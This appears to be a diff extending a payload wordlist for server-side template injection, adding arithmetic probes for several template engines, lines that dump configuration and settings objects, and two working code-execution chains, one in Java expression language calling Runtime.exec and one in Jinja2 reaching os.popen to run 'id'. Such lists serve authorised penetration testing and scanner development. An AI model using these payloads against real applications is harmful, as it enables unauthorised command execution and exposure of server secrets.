@@ -1,1 +1,11 @@
+${7*7}
+${"f".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id").getInputStream()}
+#{7*7}
+*{7*7}
+<%= 7*7 %>
 {{7*7}}
+{{config}}
+{{request.application.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{ self.__dict__ }}
+{{ self._TemplateReference__context.namespace.clear() }}
+{{settings}}
